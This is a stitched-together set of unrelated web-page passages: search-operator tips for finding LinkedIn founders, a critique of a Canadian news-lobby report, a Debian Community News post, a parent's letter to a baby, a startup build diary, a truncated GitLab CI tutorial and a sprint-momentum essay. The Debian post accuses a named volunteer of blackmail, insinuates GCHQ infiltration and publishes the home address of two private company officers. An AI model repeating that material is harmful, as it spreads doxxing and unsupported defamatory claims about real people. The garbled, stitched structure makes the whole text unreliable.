  <p><strong>Find: List of LinkedIn profiles that mention “Founder” and the words “We’re hiring”</strong></p>
</blockquote>

<ul>
<li><a href="https://www.google.com/search?rlz=1CAZAQH_enPT910&amp;ei=W91-X8nzAYbkU8eTv4AN&amp;q=site%3Alinkedin.com%2Fin%2F+%22founder+We%27re+hiring%22&amp;oq=site%3Alinkedin.com%2Fin%2F+%22founder+We%27re+hiring%22&amp;gs_lcp=CgZwc3ktYWIQAzoHCAAQRxCwA1Ck6ARYpOgEYKXwBGgDcAB4AIABPogBPpIBATGYAQCgAQKgAQGqAQdnd3Mtd2l6yAEIwAEB&amp;sclient=psy-ab&amp;ved=0ahUKEwiJjfno2KTsAhUG8hQKHcfJD9AQ4dUDCA0&amp;uact=5"><strong><code>site:linkedin.com/in/ "founder We're hiring"</code></strong></a></li>
</ul>

<p>Use case: This search should retrieve a list of founders at startups/companies that are hiring and managing a growing team. For example, if these founders match with your ICP you can directly click on the link and reach out to this person.</p>

<blockquote>
  <p><strong>Find: Google docs that contain the words “SaaS”, “conference” and “2020” in the body</strong></p>
</blockquote>

				<p>News Media Canada (NMC), the lobby group representing the major newspaper publishers in Canada, released a <a href="https://nmc-mic.ca/wp-content/uploads/2020/10/Levelling-the-Digital-Playing-Field-2020.10.19-1.pdf">new report</a> yesterday calling for the creation of a government digital media regulatory agency that would have the power to establish mandated payments for linking to news articles, establish what content is prioritized on social media sites, require companies to disclose algorithmic changes, hand over moderation control of content on news stories to the publishers, and potentially issue fines in the hundreds of millions of dollars. Canadian Heritage Minister Steven Guilbeault has made <a href="https://www.michaelgeist.ca/2020/09/get-money-from-web-giants-why-canadian-heritage-minister-steven-guilbeaults-top-legislative-priority-is-risky-business/">“get money from web giants”</a> his top legislative priority and has expressed support for<a href="https://www.michaelgeist.ca/2020/10/the-guilbeault-internet-plan-leave-it-to-the-crtc-and-copyright-board-of-canada-to-get-money-from-web-giants/"> mandated licensing for links</a>.</p>
<p>The report, which inaccurately describes the <a href="https://www.michaelgeist.ca/2020/09/there-are-many-serious-concerns-about-facebook-why-the-australia-news-fight-isnt-one-of-them/">ill-advised Australian approach</a> to licensing links to news articles, is notable for many of the things it does not say. For example, one could easily read the 41 page report and not realize that companies such as Google and Facebook do not publish full versions of news articles without a licence. Indeed, rather than “taking” content, links to news articles are posted by their users, which then send interested readers back to the original source. In fact, the media companies themselves are typically <a href="https://www.michaelgeist.ca/2020/10/a-day-in-the-life-of-the-toronto-star-on-facebook/">responsible for posting their own articles</a> and granting a licence for their use.</p>
<p>Moreover, the report includes excerpts from an opinion that concludes the sector qualifies under the USMCA’s cultural industries exemption. While that has never been in dispute, it neglects to mention that the same agreement would give the U.S. <a href="https://www.michaelgeist.ca/2020/03/the-cusma-culture-poison-pill/">the right to levy tariffs in response</a> to such a system. The NMC concludes that the measures would raise over $600 million annually, but the U.S. would be entitled to levy retaliatory measures of “equivalent commercial effect” in response to Canadian policies that would violate the trade agreement if not for cultural exemption. That cultural poison pill can be levied anywhere, meaning that the U.S. could target the dairy or steel industries, who would ultimately pay the price for the mandated levies.</p>
<p>Yet the most problematic aspects of the report isn’t what it doesn’t say, but what it does. For one thing, it incorrectly characterizes the Australian approach by suggesting that it includes expanded intellectual property rights. The <a href="https://nmc-mic.ca/wp-content/uploads/2020/10/Levelling-the-Digital-Playing-Field-2020.10.19-1.pdf">NMC report states</a>:<br>
<i><br>
</i><i>Our recommendation is to follow the lessons learned and path outlined in Australia to restore competitive balance in market conditions, which includes:</i><i><br>
</i><i><br>
</i><i>Expanding the intellectual property rights publishers have over their content (and user data) and requiring platforms license such content before using it</i></p>
<p>But the Australian approach is <a href="https://ipwars.com/2020/08/24/press-publishers-new-rights-down-under/">not tied to intellectual property rights</a>. Rather, it is grounded in competition law, not intellectual property law. By conflating the Australian and French approaches (France has pursued a press publishers’ right), the NMC does not even appear to fully understand the policies it is recommending.</p>
<p>Moreover, the NMC calls for a massive regulatory system that would hand the government dramatic new powers over the news and digital media sectors in Canada. The principle of firmly rejecting government regulation of the news sector is summarily dismissed for the sake of a payout from companies that already drive considerable traffic to Canadian news organizations. The proposal – which is remarkably <a href="https://cbc.radio-canada.ca/en/media-centre/sustaining-journalism-for-canadians">endorsed by the CBC</a> – includes the following:</p>
<ul>
<li>Establish a new federal government regulatory agency with responsibility for overseeing Internet platforms</li>
<li>Require platforms to pay licensing fees for linking to content. Failure to pay could result in fines of millions of dollars (the NMC points to ten percent of Canadian revenues)</li>
<li>Require platforms to prioritize original news content. In other words, a government agency would dictate which news stories get priority on Internet platforms</li>
<li>Require Internet companies to provide notice for any changes to algorithms affecting publishers</li>
<li>Hand over moderation of user comments to publishers</li>
</ul>
<p>When combined with Guilbeault’s other plans for the Internet, which include granting the CRTC additional powers to regulate Internet streaming services, the vision is to establish a heavily regulated Internet space in order to get money from Internet companies. There is surely a need for regulatory reforms when it comes to the Internet and I wrote recently about <a href="https://www.michaelgeist.ca/2020/10/forget-link-licensing-and-cross-subsidies-when-it-comes-to-tech-canada-should-be-focused-on-competition-law-and-tax-policy/">digital taxation and the effective application of competition laws</a>. But the NMC reforms are not about tax or marketplace fairness. Rather, they are the product of intense domestic lobbying by Canadian sectors long accustomed to regulatory protection. Should the government agree, the outcome is likely to be increased costs for consumers alongside less access to news as social media sites respond by blocking the sharing of news articles, thereby harming both media organizations and the broader public.</p>

  <hr>
  <time>Oct 26, 2020</time>
  <img width="33%" alt="Jonathan Wiltshire, jmw, Debian, GCHQ, DAM, blackmail" src="https://debian.community/assets/jonathan-wiltshire-1.png">
<p>With the Special Boat Service (SBS), cousins of the SAS, <a href="https://www.theguardian.com/uk-news/2020/oct/25/what-do-we-know-about-the-sbs">storming a ship in the English channel</a>, we feel it is a good time to finally have a look at another DAM <a href="https://debian.community/debian-blackmail-thought-reform-quickstart/">blackmailer</a> and Debian's potential connections to GCHQ.</p>

<p>Jonathan Wiltshire (jmw) works for a small IT firm, <a href="https://www.tiger-computing.co.uk/about-us/team/">Tiger Computing</a> in Monmouth, one of those small unremarkable towns in the Welsh countryside that most of us have never heard of.</p>

<p>We can see that abusive messages have been sent to Debian volunteers during UK business hours and Debian is <a href="https://www.tiger-computing.co.uk/about-us/team/">promoted on the Tiger Computing staff profile</a>.  Debian itself is not incorporated.  Therefore, we feel that it is relevant to consider both Wiltshire and his employer.</p>

<p>Britain is known to have a <a href="https://en.wikipedia.org/wiki/English_defamation_law">tough stance on defamation</a> and any volunteer who has been subject to false accusations would have a strong case under UK law against both Wiltshire and Tiger Computing.  Companies House provides <a href="https://find-and-update.company-information.service.gov.uk/company/03389961/officers">full details of the legal address for service</a>.</p>

<p>If Wiltshire and his DAMs intrude upon your family's Christmas, as they did to two volunteers in 2018, you can contact Wiltshire's boss directly.  We obtained the following names and address from the public company records:</p>

<p>Keith Andrew Edmunds and Dr Anna Cecilia Lindberg, Woodlands, Staunton, Coleford, <b>Gloucestershire</b>, GL16 8NU</p>

<p>We don't normally publish addresses in Debian Community News but in this case, there is a significant public interest factor.  Gloucestershire is the home of <a href="https://en.wikipedia.org/wiki/GCHQ">GCHQ</a>.  Various people have <a href="https://duckduckgo.com/?q=gchq+psyops+debian&amp;t=ffab&amp;ia=web">expressed concerns about GCHQ PsyOps in Debian and open source software</a>.  Each time somebody mentions this, they are censored from Planet sites and mailing lists.  Jacob Appelbaum had explicitly warned about GCHQ infiltration on the <a href="https://debian.community/debian-private-leaked/">debian-private (leaked) gossip network</a>.  In a way, Appelbaum was forecasting his own death, or in this case, the character assassination plot spreading <a href="https://duckduckgo.com/?q=debian+falsified+harassment&amp;t=ffab&amp;ia=web">falsified accusations of harassment</a>.</p>

<img src="https://debian.community/assets/appelbaum-predicted-death-debian-private.png">

<p>We've produced a convenient map showing the proximity of Tiger Computing to both Hereford, the SAS headquarters and Cheltenham, the GCHQ headquarters.</p>

<img src="https://debian.community/assets/debian-gchq-tiger-computing-conspiracy-theory.png">

<p>It is worth looking again at the email from Wiltshire's DAM buddy, Enrico Zini, <a href="https://danielpocock.com/debian-falsified-harassment-claims-appelbaum-expulsion/">fiercely decrying any possibility of a GCHQ infiltration</a>.</p>

<blockquote><em>
Subject: On coverage of Abbelbaum being "banned" from Debian<br>
Date: Wed, 22 Jun 2016 09:34:50 +0200<br>
From: Enrico Zini &lt;enrico@enricozini.org&gt;<br>
To: andrew.matler@itwire.com

<p>Dear Editor in Chief of iTWire,</p>

<p>you may want to do something about this article by Sam Varghese on
Debian revoking membership of Jacop Appelbaum:
http://www.itwire.com/business-it-news/open-source/73441-appelbaum-banned-from-debian-events-after-sexual-misconduct-charges.html</p>

<p><b>While the first part is factually correct in its DPL quote</b>, the article
ends with baseless hints of Debian and Tor having fallen victims to
manipulations by GCHQ psyops.</p>

<p>I consider that to be psycological violence[1] against the various well
known people who came out to report abuse, and I wish that news coverage
about this situation could rather contribute to creating a community
that encourages victims of abuse to speak up.</p>

<p>Quoting the DPL again, "In reaching their decision, the Debian Account
Managers took into account the public disclosures from members of the
Tor project and others, and <b>first-hand accounts from members of the
Debian community</b>."</p>

<p><b>We are not talking about vague rumors</b> spread by a couple of
infiltrators, we are talking about <b>first-person accounts</b> provided by
well known and respected members of both communities, with a track
record of contributions of many years.</p>

<p>These people who had the guts to speak up deserve credit and respect,
and the article published on your site gives them none.</p>

<p>[1] https://en.wikipedia.org/wiki/Gaslighting</p>

<p>Regards,</p>

<p>Enrico</p>
</em></blockquote>

<p>The first-hand accounts were nothing but hearsay.  On the other hand, the GCHQ connection is no conspiracy theory: it is matter of fact, if you are running one of the world's most well funded spy outfits and you <em>hadn't</em> infiltrated Debian, you wouldn't be doing your job properly.</p>

<p>British domestic police forces had been caught <a href="https://en.wikipedia.org/wiki/UK_undercover_policing_relationships_scandal">in similar games, infiltrating environment groups and making women pregnant</a>.</p>

<p>The SAS and SBS do some pretty incredible work.  Even the Australian commandos have chosen to use the name SAS because it has such a good reputation.</p>

<p>Nonetheless, like any organization, there are some bad apples.  A recently published book tells the story of former SAS heroes becoming mercenaries and <a href="https://www.dailymail.co.uk/news/article-7954259/New-book-tells-story-elite-band-ex-special-forces-wreaked-havoc-world.html">dropping grenades onto civilians from a helicopter</a>.  It is gruesome stuff.  From the article:</p>

<blockquote><em>Yet the victims were often women, children and the elderly — innocent civilians caught up in a brutal civil war that raged across the Indian Ocean state during the final decades of the 20th century.</em></blockquote>

<p>Now take a moment and compare this to the behaviour of Wiltshire and the Debian Account Managers, creating false accusations about volunteers and circulating them to over a thousand developers on the <a href="https://debian.community/debian-private-leaked/">debian-private (leaked) gossip network</a>.  In one case, Wiltshire, Zini and Jaspert threw one of these grenades at a volunteer and his family on Christmas eve.</p>

<p>It took the SBS less than 10 minutes to seize control of the ship in unpleasant weather on a Sunday afternoon.  Some of them even went back home in time to give their kids a bedtime story.  Would it really be any more difficult than that for GCHQ to infiltrate a free software project?</p>

They don’t know who you are yet, and you don’t know them either, but these people will one day be your friends, your classmates, your romantic interests, your neighbors, your teachers, the list goes on.</p><p><span><strong>One of the first lessons you’ll learn is that we all want certain things, but we can’t have everything we want. And the way you respond to this reality is what builds character.</strong></span></p><p>You’ll experience this relatively soon, but let’s say that you’re playing with a toy that another child next to you wants. When that happens, your first instinct will be to be protective of what you have, and to keep the toy all for yourself. You’ll think that if you give it up, then it’s no longer yours, and that you had to sacrifice something that was so precious to you.</p><p>But in reality, the best thing for you to do here is to <span><strong>be kind</strong></span>. Kindness is the ability to trade personal gain for mutual trust. By being kind and sharing your toy, you are telling the other child, “Hey. I want to play with this toy too, but by sharing it, I want us to both be able to have fun together now, and also sometime in the future.” By being selfless, you are extending an invitation to enjoy the moment together, and are assuring the other person that you can expect a similar experience if your paths happen to cross again.</p><p>Kindness is what builds friendships. It’s what creates long-lasting partnerships. It is the force that develops trust between you and others, and when it comes to relationships, <span><strong>trust is everything</strong></span>.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3.png" alt="kids sharing a toy together cartoon illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>The best thing about kindness is that there is no limit to how much you can share, and there is no shortage of people that need it. This leads me to another important thing to remember:</p><p><span><strong>Not everyone is as fortunate to have what you have. The fact that you were born into a loving community places you in a position of abundant opportunity that many others don’t have.</strong></span></p><p>Keep this in mind when you encounter people that you believe are undeserving of your kindness or generosity. While it’s tempting to write these people off immediately, remember that their life experiences are completely different from yours. Just because you don’t understand someone’s behavior doesn’t mean that you are right, and they are wrong. They may not have had the same kind of support network you were born into, or their network simply had values that translated into a wildly different worldview.</p><p>Trying to see their side of the story is another form of kindness that has less to do with sharing, and more to do with listening.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend.png" alt="listening to each other drawing illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>At this point, you might be thinking that eating and sleeping sounds like a far easier life, eh?</p><p>I totally get it. It all sounds like a lot to take in, and it may feel like learning more about the world just introduces more issues that you have to sort through. However, this points to another important thing you’ll realize:</p><p><span><strong>What makes life interesting are its challenges, not its comforts. This is one of those funny things that will only make sense once you live through it.</strong></span></p><p>This is why Mom and Dad won’t give you everything you want, even if we’re more than capable of giving it. Life is weird in that you can desire something a lot, but you’ll value it far less if you didn’t have to work for it. The reward is far less important than the lessons you had to learn to get it, and this holds true for almost everything.</p><p>So if you get frustrated that we’re not giving you what you want, it’s not because we want you to suffer. It’s because we’d rather show you a glimpse of what the world is really like, and not hide you from a reality that you will inevitably experience anyway.</p><p>You’ll soon understand the value of challenges (you’re going to learn how to crawl in a few months!), but one important nuance to keep in mind is that <span><strong>not all challenges are created equal</strong></span>.</p><p>Being challenged by an interesting problem is very different from being challenged by an uninteresting one. If you are working through worthwhile problems, you’ll learn the most because your curiosity is shining bright, and this light will give you the resilience required to traverse difficult yet meaningful journeys. But if your challenge is about fighting off boredom while working on something you could care less about, no reward will matter much in the end.</p><p>You’ll one day learn that money is one of these rewards people get for their work. While it’s important to understand that making money requires various tradeoffs of time and energy, just remember this: <span><strong>Making a lot of money doing something you hate will be far less rewarding than making enough money doing something you love.</strong></span></p><p>Freedom is achieved by clearly defining what “enough” means, and by keeping it there even after you’ve reached it. This allows curiosity – and not money – to be the guiding principle behind why you do the things you do.</p><p>Only then can you dive deeply into the challenges that you can’t stop thinking about.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges.png" alt="diving deep into challenges and problems" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Speaking of thought, this leads to another important thing I wanted to share with you:</p><p><span><strong>The most valuable resource you have is not money, not your time, but the way you spend your attention. The way you use your mind will color the way you view the world, so be mindful of the information and people you are in regular contact with.</strong></span></p><p>By surrounding yourself with people you love, you build a world where you are loved. By applying yourself to worthwhile challenges, you live a life where everything is meaningful. By choosing to see the good in humanity, you feel empowered to live up to that standard.</p><p>There will be many forces fighting for your attention, and the greatest skill to cultivate is discerning what to allow, and what to disregard. Mom and Dad can help you navigate that in the beginning, but ultimately, this is something you’ll have to figure out for yourself as you grow up and meet more people.</p><p>Your attention is precious, so be wary of those that try to cheapen it or game it for themselves. By protecting your most valuable resource, you respect the power of your thoughts, and are made aware of what those thoughts are capable of accomplishing.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind.png" alt="hugging the mind cartoon illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>As your dad, I understand that I’m going to have a lot of your attention in the beginning. My voice will be a loud one, as I’m going help guide you through all kinds of life problems. It’s going to seem like I have all the answers, and that I’ll know all the right things to say at all the right moments.</p><p>But this is short-lived.</p><p>The reality is that Dad is very flawed, and Dad doesn’t know nearly as much as you once thought. You’ll realize this over time, especially as you expand your circle of friends, loved ones, and people that you admire. And as all those voices grow in influence, it’s only inevitable that mine will decrease in volume. What you once took as certainties from me will merely become suggestions, and to be clear, this is perfectly normal. You don’t ever have to feel bad about that, as that’s just what happens as your world grows.</p><p>All I can hope for is that you’ll continue to interpret my voice as a positive one; one that you can always come to when you need a reminder of how much you are loved. Because if there’s one thing you can count on, it’s that. Mom and Dad will be here for you, no matter what.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging.png" alt="family hugging each other drawing illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>In the meantime, your world is a much simpler place.

<p>When I get something in my head I dive in. And I dive deep. For example, a month ago I ran into a problem. One week later I solved it. And three weeks after that I turned it into a (tiny) business.</p>

<p>Here’s how I went from an idea in a notebook to my first paying customer. In 31 days.</p>

<h2 id="the-problem">The problem</h2>

<p>It started when I was finishing up a <a href="https://masilotti.com/test-deep-links-with-ui-testing/">blog post</a>. I had everything ready: the article was proof read, the code samples were in place, and a gist was uploaded to GitHub.</p>

<p>But I forgot about the social share image. You know, the little preview that pops up when you tweet a link.</p>

<p><img src="https://masilotti.com/images/twitter-card.png" alt="Twitter card preview for blog post"></p>

<p>I spent <em>forever</em> trying to find the perfect stock photo. I tried all the “no design” tools to create one in my browser. Some were OK, a few were good, but most were just plain <em>generic</em>.</p>

<p>So I vowed to never waste another second generating these images.</p>

<h2 id="the-process">The process</h2>

<p>What follows is a day-by-day overview of what I worked on and important milestones in building up the implementation.</p>

<h3 id="day-1-the-idea">Day 1: The idea</h3>

<p>What if I could automate all my social share images? Instead of futzing with a tool, I wanted to just drop a URL on my page and have that generate a decent looking preview.</p>

<p>So I jotted some notes for a MVP. What’s the absolute least I could build to get market validation?</p>

<p><img src="https://masilotti.com/images/notebook.jpeg" alt="Notes for Mugshot Bot on August 18, 2020"></p>

<p>If you can’t read my chicken scratch most of those notes touch on three basic pieces of functionality.</p>
<ol>
  <li>Scrape a website for the <code>og:title</code> and <code>og:description</code></li>
  <li>Render an HTML view with a fixed design and drop in the scraped content</li>
  <li>Convert to an image and host it</li>
</ol>

<p>Turns out, if I kept the scope very narrow I could get something built pretty quickly. And so <a href="https://www.mugshotbot.com/?utm_source=masilotti.com">Mugshot Bot</a> was born.</p>

<h3 id="day-2-rails-new">Day 2: <code>rails new</code></h3>

<p>Ah, the most exciting part of a project, creating a new app!</p>

<p>I spent the better part of the next few days heads down getting something working. Rails, Active Storage, and <code>wkhtmlto*</code> were all key players in being able to build something so quickly.</p>

<p>Having a hyper-focused scope encouraged me to work on only what mattered. There was no pressure to make things look pretty yet, just get it working.</p>

<h3 id="day-4-launch-the-mvp">Day 4: Launch the MVP</h3>

<p>Three days later I had something working. It was ugly and there was no landing page, but it worked.</p>

<p><img src="https://masilotti.com/images/mugshot-bot-v1.jpeg" alt="v1 of Mugshot Bot"></p>

<p>I <a href="https://twitter.com/joemasilotti/status/1296089448942379008">tweeted</a> asking for beta testers and discovered a few folks who were interested in helping. A few DMs later and the images were live on three different blogs!</p>

<p>I also <a href="https://news.ycombinator.com/item?id=24335060">posted to Hacker News</a> with low expectations. But I made it to the top of the second page and generated over 2000 clicks.</p>

<h3 id="days-5-21-gather-feedback-improve-rinse-and-repeat">Days 5-21: Gather feedback, improve, rinse and repeat</h3>

<p>The next two weeks were spent talking to as many people as possible to ask as many questions as they would answer.</p>

<p>I learned a lot of valuable information, including what to call these little images. Most importantly, people were excited. Turns out I wasn’t the only one running into this problem.</p>

<p>During this time I also built out a landing page to test copy. This was helpful in learning how people describe the problem.</p>

<p><img src="https://masilotti.com/images/mugshot-bot-landing.jpeg" alt="Mugshot Bot landing page v1"></p>

<p>Every feature from here on out has come from (potential) customer feedback. This was an important learning because I usually build things where I’m the only customer.</p>

<h3 id="day-22-launch-customizations">Day 22: Launch customizations</h3>

<p>The most requested feature by a long shot was customizations. Bloggers wanted to make their social share images look like their own, with their own branding.</p>

<p><img src="https://masilotti.com/images/mugshot-bot-v2.png" alt="v2 of Mugshot Bot"></p>

<p>So I added <a href="https://github.com/thoughtbot/clearance">Clearance</a> for authentication and launched <code>/customize</code>, a single form to change a variety of settings. Now bloggers could change the accent color, the background pattern, and even upload a branded image for one of the themes.</p>

<p>Simple, on purpose. Because that’s exactly what folks had asked for.</p>

<h3 id="day-31-first-paying-customer">Day 31: First paying customer!</h3>

<p>I spent all day Saturday at <a href="https://www.weekendclub.co/?utm_source=masilotti.com">Weekend Club</a>, an Indie Hacker accountability community. Even though I had to start early (5am EST!) I was able to finish up the Stripe integration and create a Pro plan for exclusive themes.</p>

<p>I received a ton of valuable feedback throughout the day. Everything from design tweaks to UX pointers to newsletter recommendations. And before the end of the day, <strong>BOOM</strong>! Someone saw enough value in the product to start paying for the Pro features.</p>

<h2 id="the-takeaways">The takeaways</h2>

<p>I’m a developer at heart. I love to build things. But I spent <em>more than half</em> of the month talking to potential customers.</p>

<p>It took just 3 days to build an MVP. I could have spent 3 months building something that was “better” but with zero market fit.</p>

<p>It’s easy to read books and learn how important this step is in building a product. But to actually <em>live</em> it is mind blowing. And the results speak for themselves.</p>

<h3 id="looking-forward">Looking forward</h3>

<p>In no way is this journey complete. Hell, it’s only the beginning.</p>

<p><a href="https://www.mugshotbot.com/?utm_source=masilotti.com">
  <img src="https://masilotti.com/images/mugshot-bot-v3.jpg" alt="v3 of Mugshot Bot">
</a></p>

<p>Acquiring a customer is one of the most motivating things I’ve done since going independent. I’ve never been more excited about building something.</p>

        <p><small>2020-10-26</small></p>

        <p>If you’re like me, you develop a lot of things and test on Raspberry Pis (ARM) and then deploy to production on AMD64 processors. This is all well and good, if you don’t mind spending time re-building the containers on each architecture, but I do mind. I want to write code, not deal with the back-end non-sense.</p>

<p>I’m a big fan of Gitlab’s CI/CD platform, so I figured there should be a good way to use it to get me to my goals. It turns out, it was pretty simple.</p>

<p>In the end, we’ll be able to commit some code and Gitlab will build the Docker containers then push them to Docker Hub.</p>

<p>First, you’ll need to log in to Docker Hub and create an Access Token <code>Username -&gt; Account Settings -&gt; Security</code>. While you’re here, go ahead and create a repository for your docker images. You’ll need the repo name later.</p>

<p>Now head over to your repository on <a href="https://wes.today/gitlab.com">gitlab.com</a> and add your Username and Access Key as Variables <code>Settings -&gt; CI/CD -&gt; Variables</code>. You’ll want to create two variables with the following key:value pairs. I flagged my variables as Protected and Masked so they wouldn’t show up in my CI/CD logs.</p>

<div><div><pre><code>Key: DOCKER_USERNAME
Value: youruserhere

Key: DOCKER_PASSWORD
Value: youraccesstokenhere
</code></pre></div></div>

<p>Now you’ll want to create a <code>.gitlab-ci.yml</code> file in your project and fill it in with the code below. The only thing you’ll need to change is the very last line where you will want to replace <code>repo-name</code> with the name of your Docker Hub Repository. Commit and Push the new <code>.gitlab-ci.yml</code> file and in a few minutes you should see your Docker images in Docker Hub.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p><em>or Who is Literally the Most Unstoppable Person?</em></p>

<p>
A simple question really.
It popped into my head around the time of the 2012 London Olympics.
I was still playing rugby and studying physics among other things.
It was also likely sparked—at least in part—by a bet I had lost several years prior, that I was heavier than Usain bolt... I was probably around thirteen. Lesson learned.
</p>

<p>
In rugby you quickly learn that the heavier and faster someone is, the harder they are to tackle.
In physics you learn this concept is called momentum (usually given the symbol \(p\)), and is simply an object's mass multiplied by its velocity.

$$p=mv$$
</p>

<p>
Obviously this does not capture <em>all</em> of what makes someone difficult to tackle.
It doesn't account for running technique, agility, or whether they are currently coated in grease.
But it's a pretty good start.
</p>

<p>
After watching Usain Bolt dominate the 100&nbsp;m sprint yet again, the first question became: “Sure he's the fastest, but is he the hardest to stop?”.
</p>

<p>
In the spirit of keeping things simple we're just going to be comparing athletes' <em>average</em> momentum—as it's easy to work out—but it would also be interesting to look into maximums and some other metrics.
I will leave those to the dedicated reader.
Thankfully this sprint distance is pretty relevant because 100&nbsp;m <em>is</em> the length of rugby pitch, which may be why Europeans don't use football fields as a unit of measurement.
</p>

<p>
As a brief refresher, we can work out the velocity (\(v\)) of something given a distance travelled and the time it took:

$$v = \frac{distance}{time}$$

So to get someone's average momentum we can substitute this into the first equation to get:

$$p = \frac{\text{mass} \times \text{distance}}{\text{time}}$$

Which is a super simple calculation. Just multiply their weight (in kilograms) by the distance (in metres) then divide by the time it took (in seconds). The unit of the resulting number will be kilogram metres per second (kg&nbsp;m/s) or equivalently Newton seconds (N&nbsp;s).
</p>

<p>
So if we rescore the men's 2012 Olympics 100m Sprint:
</p>

<table id="sprint2012">
  <tbody><tr>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(1)')">Athlete</th>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(2)')">Weight (kg)</th>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(3)')">Time (s)</th>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(4)')">Avg Momentum (N&nbsp;s)</th>
  </tr>
  <tr>
